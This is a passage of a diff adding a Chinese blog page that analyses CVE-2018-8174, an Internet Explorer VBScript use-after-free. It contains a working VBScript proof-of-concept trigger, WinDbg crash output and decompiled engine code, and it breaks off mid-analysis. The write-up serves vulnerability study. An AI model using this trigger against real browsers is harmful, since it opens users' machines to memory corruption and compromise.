@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;#x539F;&amp;#x6587;&amp;#x5730;&amp;#x5740;&amp;#xFF1A;https://www.freebuf.com/vuls/172983.html 0x00 &amp;#x80CC;&amp;#x666F;2018&amp;#x5E74;5&amp;#x6708;9&amp;#x65E5;&amp;#xFF0C;360&amp;#x53D1;&amp;#x8868;Blog &amp;#x201C;Analysis of CVE-2018-8174 VB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2018-8174：从UAF到任意地址读写">
+<meta property="og:url" content="https://saturn35.github.io/2019/08/12/20190812-1/index.html">
+<meta property="og:site_name" content="Saturn35">
+<meta property="og:description" content="&amp;#x539F;&amp;#x6587;&amp;#x5730;&amp;#x5740;&amp;#xFF1A;https://www.freebuf.com/vuls/172983.html 0x00 &amp;#x80CC;&amp;#x666F;2018&amp;#x5E74;5&amp;#x6708;9&amp;#x65E5;&amp;#xFF0C;360&amp;#x53D1;&amp;#x8868;Blog &amp;#x201C;Analysis of CVE-2018-8174 VB">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://saturn35.github.io/2019/08/12/20190812-1/6.png">
+<meta property="og:image" content="https://saturn35.github.io/2019/08/12/20190812-1/7.png">
+<meta property="og:image" content="https://saturn35.github.io/2019/08/12/20190812-1/1.png">
+<meta property="og:image" content="https://saturn35.github.io/2019/08/12/20190812-1/2.png">
+<meta property="og:image" content="https://saturn35.github.io/2019/08/12/20190812-1/3.png">
+<meta property="og:image" content="https://saturn35.github.io/2019/08/12/20190812-1/4.png">
+<meta property="og:image" content="https://saturn35.github.io/2019/08/12/20190812-1/5.png">
+<meta property="og:updated_time" content="2019-12-28T05:22:39.091Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE-2018-8174：从UAF到任意地址读写">
+<meta name="twitter:description" content="&amp;#x539F;&amp;#x6587;&amp;#x5730;&amp;#x5740;&amp;#xFF1A;https://www.freebuf.com/vuls/172983.html 0x00 &amp;#x80CC;&amp;#x666F;2018&amp;#x5E74;5&amp;#x6708;9&amp;#x65E5;&amp;#xFF0C;360&amp;#x53D1;&amp;#x8868;Blog &amp;#x201C;Analysis of CVE-2018-8174 VB">
+<meta name="twitter:image" content="https://saturn35.github.io/2019/08/12/20190812-1/6.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://saturn35.github.io/2019/08/12/20190812-1/">
+
+
+
+
+
+
+  <title>CVE-2018-8174：从UAF到任意地址读写 | Saturn35</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Saturn35</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://saturn35.github.io/2019/08/12/20190812-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Saturn35">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Saturn35">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CVE-2018-8174：从UAF到任意地址读写</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-12T14:00:12+08:00">
+                2019-08-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  10,407
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  56
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&#x539F;&#x6587;&#x5730;&#x5740;&#xFF1A;<a href="https://www.freebuf.com/vuls/172983.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/172983.html</a></p>
+<h4 id="0x00-&#x80CC;&#x666F;"><a href="#0x00-&#x80CC;&#x666F;" class="headerlink" title="0x00 &#x80CC;&#x666F;"></a><strong>0x00 &#x80CC;&#x666F;</strong></h4><p>2018&#x5E74;5&#x6708;9&#x65E5;&#xFF0C;360&#x53D1;&#x8868;Blog &#x201C;Analysis of CVE-2018-8174 VBScript 0day and APT actor related toOffice targeted attack&#x201D; &#x63ED;&#x9732;&#x4E86;&#x5229;&#x7528;&#x201C;&#x53CC;&#x6740;&#x201D;0day&#x53D1;&#x8D77;&#x7684;APT&#x653B;&#x51FB;&#xFF0C;&#x5176;&#x4E2D;&#x4F7F;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x5C31;&#x662F;IE vbscript 0day&#xFF1A;CVE-2018-8174&#xFF0C;&#x4E0D;&#x4E45;&#x8BE5;&#x6837;&#x672C;&#x5C31;&#x5728;&#x4E92;&#x8054;&#x7F51;&#x88AB;&#x516C;&#x5E03;&#x3002;&#x7531;&#x4E8E;360&#x7684;Blog&#x5E76;&#x6CA1;&#x6709;&#x5BF9;&#x6F0F;&#x6D1E;&#x539F;&#x7406;&#x548C;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#x7684;&#x5229;&#x7528;&#x65B9;&#x6CD5;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#xFF0C;&#x4E14;&#x539F;&#x59CB;&#x6837;&#x672C;&#x6DF7;&#x6DC6;&#x4E25;&#x91CD;&#xFF0C;&#x7B14;&#x8005;&#x5BF9;&#x6837;&#x672C;&#x8FDB;&#x884C;&#x4E86;&#x7B80;&#x5316;&#xFF0C;&#x91CD;&#x70B9;&#x8BF4;&#x660E;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x548C;&#x5982;&#x4F55;&#x5229;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#xFF0C;&#x5E0C;&#x671B;&#x5E2E;&#x52A9;&#x5927;&#x5BB6;&#x66F4;&#x597D;&#x7684;&#x7406;&#x89E3;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x3002;</p>
+<p>&#x8EAB;&#x4E3A;&#x6F0F;&#x6D1E;&#x5B66;&#x4E60;&#x8005;&#xFF0C;&#x5206;&#x6790;&#x4E4B;&#x524D;&#x660E;&#x786E;&#x5206;&#x6790;&#x76EE;&#x7684;&#xFF1A;<br>1&#x3001;uaf&#x6F0F;&#x6D1E;&#x672C;&#x8EAB;&#x7684;&#x6210;&#x56E0;<br>2&#x3001;CVE-2018-8174&#x6F0F;&#x6D1E;&#x7684;&#x6210;&#x56E0;<br>3&#x3001;&#x731C;&#x6D4B;&#x5E76;&#x9A8C;&#x8BC1;vbs&#x5F15;&#x64CE;&#x5982;&#x4F55;&#x53BB;&#x4FEE;&#x590D;&#x8BE5;&#x6F0F;&#x6D1E;<br>4&#x3001;&#x7B80;&#x5355;&#x63A2;&#x6D4B;vbs&#x865A;&#x62DF;&#x673A;&#x673A;&#x5236;&#x3001;&#x66F4;&#x6DF1;&#x5C42;&#x6B21;&#x7684;&#x53BB;&#x7406;&#x89E3;vbs&#x5BF9;&#x8C61;&#xFF0C;&#x5B66;&#x4E60;&#x66F4;&#x7EC6;&#x7C92;&#x5EA6;&#x7684;&#x8C03;&#x8BD5;&#x6280;&#x5DE7;&#xFF0C;&#x5B66;&#x4E60;&#x603B;&#x7ED3;&#x8BE5;&#x6F0F;&#x6D1E;Exp&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x3002;<br>5&#x3001;&#x5B66;&#x4E60;&#x9488;&#x5BF9;vbs&#x5F15;&#x64CE;&#x7684;windbg&#x63D2;&#x4EF6;&#x6269;&#x5C55;<br>6&#x3001;&#x5C1D;&#x8BD5;&#x8FD8;&#x539F;&#x5B8C;&#x6574;&#x5229;&#x7528;&#x3002;</p>
+<p><strong>//&#x5173;&#x952E;&#x8BCD;&#xFF1A;UAF  &#x4EFB;&#x610F;&#x5730;&#x5740;&#x5199;  &#x653B;&#x51FB;&#x865A;&#x8868;  ZwContinue &#x6539;&#x53D8;&#x4E0A;&#x4E0B;&#x6587;</strong></p>
+<h4 id="0x01-&#x6F0F;&#x6D1E;&#x539F;&#x7406;"><a href="#0x01-&#x6F0F;&#x6D1E;&#x539F;&#x7406;" class="headerlink" title="0x01 &#x6F0F;&#x6D1E;&#x539F;&#x7406;"></a><strong>0x01 &#x6F0F;&#x6D1E;&#x539F;&#x7406;</strong></h4><p>POC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language=&quot;vbscript&quot;&gt;</span><br><span class="line">Dim array_a</span><br><span class="line">Dim array_b(1)</span><br><span class="line">Class Trigger</span><br><span class="line">    Private Sub Class_Terminate()</span><br><span class="line">        Set array_b(0)=array_a(1)</span><br><span class="line">        array_a(1)=1</span><br><span class="line">    End Sub</span><br><span class="line">End Class</span><br><span class="line">Sub UAF</span><br><span class="line">    ReDim array_a(1)</span><br><span class="line">    Set array_a(1) = New Trigger</span><br><span class="line">    Erase array_a</span><br><span class="line">End Sub</span><br><span class="line">Sub TriggerVuln</span><br><span class="line">    array_b(0)=0</span><br><span class="line">End Sub</span><br><span class="line">Sub StartExploit</span><br><span class="line">    UAF</span><br><span class="line">    TriggerVuln</span><br><span class="line">End Sub</span><br><span class="line">StartExploit</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;Trigger&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x8D4B;&#x503C;&#x7ED9;&#x6570;&#x7EC4;array_a (1)&#xFF0C;&#x5E76;&#x901A;&#x8FC7;Erase array_a&#x6E05;&#x7A7A;array_a&#x4E2D;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x89E6;&#x53D1;&#x811A;&#x672C;&#x4E2D;Class_Terminate&#x7684;&#x8C03;&#x7528;&#xFF0C;&#x5176;&#x4E2D;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;array_b(0)&#x5BF9;Trigger&#x5B9E;&#x4F8B;&#x7684;&#x5F15;&#x7528;&#xFF08;Trigger&#x5B9E;&#x4F8B;&#x5F15;&#x7528;&#x8BA1;&#x6570;+1&#xFF09;&#xFF0C;&#x518D;&#x901A;&#x8FC7;array_a (1)= 1&#x5220;&#x9664;array_a (1) &#x5BF9;Trigger&#x5B9E;&#x4F8B;&#x7684;&#x5F15;&#x7528;&#xFF08;Trigger&#x5B9E;&#x4F8B;&#x5F15;&#x7528;&#x8BA1;&#x6570;-1&#xFF09;&#x6765;&#x5E73;&#x8861;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#xFF0C;Trigger&#x5B9E;&#x4F8B;&#x4F1A;&#x88AB;&#x91CA;&#x653E;&#xFF0C;&#x4F46;&#x662F;array_b(0)&#x4ECD;&#x7136;&#x4FDD;&#x7559;&#x4E86;&#x8FD9;&#x4E2A;Trigger&#x5B9E;&#x4F8B;&#x7684;&#x5F15;&#x7528;&#xFF0C;&#x5373;&#x4E3A;&#x60AC;&#x6302;&#x6307;&#x9488;&#xFF0C;array_b(0) = 0&#x8BBF;&#x95EE;&#x672A;&#x5206;&#x914D;&#x5185;&#x5B58;&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;&#x3002;&#x5F00;&#x542F;hpa&#x548C;ust&#x89C2;&#x5BDF;&#x6F0F;&#x6D1E;&#x73B0;&#x573A;&#xFF1A; <strong>(iexplore.exe!!!!!!!!!!!!!!!!!!!!!!!!!!  not iexplorer.exe!!!!)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(d08.388): Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">eax=05f4ffd0 ebx=06c44fe0 ecx=00000009 edx=00000002 esi=06c44fe0 edi=00000009</span><br><span class="line">eip=762c4971 esp=0475cd64 ebp=0475cd6c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">OLEAUT32!VariantClear+0xb3:</span><br><span class="line">762c4971 8b08            mov     ecx,dword ptr [eax]  ds:0023:05f4ffd0=????????</span><br><span class="line">0:005&gt; !heap -p -a eax</span><br><span class="line">    address 05f4ffd0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 671000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    83a0f3c:          5f4f000             2000</span><br><span class="line">    6ee190b2 verifier!AVrfDebugPageHeapFree+0x000000c2</span><br><span class="line">    77cf65f4 ntdll!RtlDebugFreeHeap+0x0000002f</span><br><span class="line">    77cba0aa ntdll!RtlpFreeHeap+0x0000005d</span><br><span class="line">    77c865a6 ntdll!RtlFreeHeap+0x00000142</span><br><span class="line">    778998cd msvcrt!free+0x000000cd</span><br><span class="line">    6ac8406c vbscript!VBScriptClass::`vector deleting destructor&apos;+0x00000019</span><br><span class="line">    6ac8411a vbscript!VBScriptClass::Release+0x00000043//</span><br><span class="line">    762c4977 OLEAUT32!VariantClear+0x000000b9</span><br><span class="line">    6c59e433 IEFRAME!Detour_VariantClear+0x0000002f</span><br><span class="line">    762de325 OLEAUT32!ReleaseResources+0x000000a3//OLEAUT32&#x6A21;&#x5757;&#x8D1F;&#x8D23;&#x76F8;&#x5173;&#x6570;&#x636E;&#x7684;&#x6E05;&#x7406;</span><br><span class="line">    762ddfb3 OLEAUT32!_SafeArrayDestroyData+0x00000048</span><br><span class="line">    762e5d2d OLEAUT32!SafeArrayDestroyData+0x0000000f</span><br><span class="line">    762e5d13 OLEAUT32!Thunk_SafeArrayDestroyData+0x00000039</span><br><span class="line">    6acc267f vbscript!VbsErase+0x00000057  //vbscript&#x6A21;&#x5757;&#x8D1F;&#x8D23;&#x5BF9;&#x8C61;&#x6307;&#x9488;&#x7684;&#x62C6;&#x9664;</span><br><span class="line">    6ac73854 vbscript!StaticEntryPoint::Call+0x00000011</span><br><span class="line">    6ac7586e vbscript!CScriptRuntime::RunNoEH+0x00001c10</span><br><span class="line">    6ac74ff6 vbscript!CScriptRuntime::Run+0x00000064</span><br><span class="line">    6ac74f79 vbscript!CScriptEntryPoint::Call+0x00000051</span><br><span class="line">    6ac7586e vbscript!CScriptRuntime::RunNoEH+0x00001c10</span><br><span class="line">    6ac74ff6 vbscript!CScriptRuntime::Run+0x00000064</span><br><span class="line">    6ac74f79 vbscript!CScriptEntryPoint::Call+0x00000051</span><br><span class="line">    6ac7586e vbscript!CScriptRuntime::RunNoEH+0x00001c10</span><br><span class="line">    6ac74ff6 vbscript!CScriptRuntime::Run+0x00000064</span><br><span class="line">    6ac74f79 vbscript!CScriptEntryPoint::Call+0x00000051</span><br><span class="line">    6ac7512b vbscript!CSession::Execute+0x000000c8</span><br><span class="line">    6ac7536e vbscript!COleScript::ExecutePendingScripts+0x00000146</span><br><span class="line">    6ac80e4a vbscript!COleScript::ParseScriptTextCore+0x00000247</span><br><span class="line">    6ac793e8 vbscript!COleScript::ParseScriptText+0x0000002b</span><br><span class="line">    66e0f774 mshtml!CScriptCollection::ParseScriptText+0x00000218</span><br><span class="line">    66e0f58c mshtml!CScriptElement::CommitCode+0x000003c2</span><br><span class="line">    66e0f34f mshtml!CScriptElement::Execute+0x000000c6</span><br><span class="line">    66df2d52 mshtml!CHtmParse::Execute+0x0000004a</span><br></pre></td></tr></table></figure>
+
+<p>05f4ffd0&#x662F;&#x4E00;&#x5757;&#x5DF2;&#x7ECF;&#x91CA;&#x653E;&#x7684;&#x5185;&#x5B58;&#xFF0C;windbg&#x8BB0;&#x5F55;&#x4E86;&#x5BF9;&#x8BE5;&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x7684;&#x4EE3;&#x7801;&#x56DE;&#x6EAF;&#x60C5;&#x51B5;&#x3002;</p>
+<p>vbscript!VbsErase&#x5373;&#x5BF9;&#x5E94;&#x4E86;&#x811A;&#x672C;&#x4E2D;&#x7684;Erase&#xFF0C;&#x800C;eax&#x6B63;&#x662F;&#x88AB;VBScriptClass::Release&#x51FD;&#x6570;&#x91CA;&#x653E;&#x7684;VBScriptClass&#x5BF9;&#x8C61;&#x4E5F;&#x5C31;&#x662F;&#x811A;&#x672C;&#x4E2D;&#x7684;Trigger&#x5B9E;&#x4F8B;&#x3002;&#x8FD9;&#x91CC;&#x770B;&#x4E0B;VBScriptClass::Release&#x7684;&#x903B;&#x8F91;&#xFF1A; </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LONG __stdcall VBScriptClass::Release(VBScriptClass *this)</span><br><span class="line">{</span><br><span class="line">  VBScriptClass *v1; // ebx@1</span><br><span class="line">  volatile LONG *v2; // edi@1</span><br><span class="line">  LONG v4; // [sp+14h] [bp+8h]@1</span><br><span class="line"></span><br><span class="line">  v1 = this;</span><br><span class="line">  v2 = (volatile LONG *)((char *)this + 4);</span><br><span class="line">  v4 = InterlockedDecrement((volatile LONG *)this + 1);//&#x5BF9;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x51CF;&#x4E00;</span><br><span class="line">  if ( !v4 )//&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x4E3A;0  &#x5F00;&#x59CB;&#x91CA;&#x653E;</span><br><span class="line">  {</span><br><span class="line">    InterlockedIncrement(v2); //&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x52A0;&#x4E00;</span><br><span class="line">    VBScriptClass::TerminateClass(v1);//&#x91CD;&#x8F7D;Terminate_Class</span><br><span class="line">    v4 = InterlockedDecrement(v2);//&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x51CF;&#x4E00;</span><br><span class="line">    if ( !v4 )</span><br><span class="line">    {</span><br><span class="line">      if ( v1 )</span><br><span class="line">        (*(void (__thiscall **)(VBScriptClass *, signed int))(*(_DWORD *)v1 + 104))(v1, 1);//&#x8C03;&#x7528;&#x865A;&#x8868;&#x6790;&#x6784;&#x51FD;&#x6570;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  return v4;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>Release&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x5F53; VBScriptClass::TerminateClass(v1)&#x6267;&#x884C;&#x65F6;&#xFF08;&#x5185;&#x90E8;&#x4F1A;&#x5224;&#x65AD;&#x8BE5;&#x51FD;&#x6570;&#x662F;&#x5426;&#x91CD;&#x8F7D;&#xFF0C;&#x82E5;&#x5B58;&#x5728;&#x91CD;&#x8F7D;&#x5219;&#x8C03;&#x7528;&#x7528;&#x6237;&#x5B9A;&#x4E49;&#x7684;&#x91CD;&#x8F7D;&#x51FD;&#x6570;&#xFF09;&#xFF0C;&#x6700;&#x540E;&#x8C03;&#x7528;&#x7C7B;&#x865A;&#x51FD;&#x6570;&#x8868;&#x4E2D;&#x7684;&#x6790;&#x6784;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x6700;&#x540E;&#x91CA;&#x653E;&#x5904;&#x7406;&#x3002;&#x5C3D;&#x7BA1;&#x91CA;&#x653E;&#x4E86;&#x5185;&#x5B58;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x7559;&#x4E0B;&#x4E86;&#x60AC;&#x6302;&#x6307;&#x9488;array_b(0)&#x3002;</p>
+<p>Kanxue <a href="https://bbs.pediy.com/thread-249933.htm" target="_blank" rel="noopener">&#x201C;&#x8F93;&#x51FA;&#x5168;&#x9760;&#x543C;&#x201D;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;</a><a href="https://bbs.pediy.com/thread-249933.htm" target="_blank" rel="noopener">&#x201D;&#x63A2;&#x7D22;CVE-2018-8174</a>&#x4E2D;&#xFF0C;&#x63D0;&#x51FA;&#x4E86;&#x4E0B;&#x9762;&#x7684;&#x95EE;&#x9898;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x7814;&#x7A76;&#xFF1A;</p>
+<p>Release&#x51FD;&#x6570;&#x903B;&#x8F91;&#x4E0A;&#x5E76;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#xFF0C;&#x4ECE;C/C++&#x5F00;&#x53D1;&#x7684;&#x89D2;&#x5EA6;&#x770B;&#xFF0C;&#x6211;&#x4EEC;&#x8F83;&#x96BE;&#x53BB;&#x63A7;&#x5236;&#x91CD;&#x8F7D;&#x7684;&#x6790;&#x6784;&#x51FD;&#x6570;&#x505A;&#x4E86;&#x54EA;&#x4E9B;&#x5371;&#x9669;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x601D;&#x8003;&#x4E00;&#x4E0B;&#x8BE5;&#x6F0F;&#x6D1E;&#x5E94;&#x5982;&#x4F55;&#x53BB;&#x4FEE;&#x590D;&#xFF1F;&#x8981;&#x5F04;&#x6E05;&#x695A;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x8DDF;&#x8E2A;&#x91CD;&#x8F7D;&#x7684;Terinate&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;&#x6D41;&#x7A0B;&#x3002;</p>
+<p>&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;TerminateClass&#x51FD;&#x6570;&#x7684;&#x9006;&#x5411;&#x7ED3;&#x679C;&#xFF1A;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 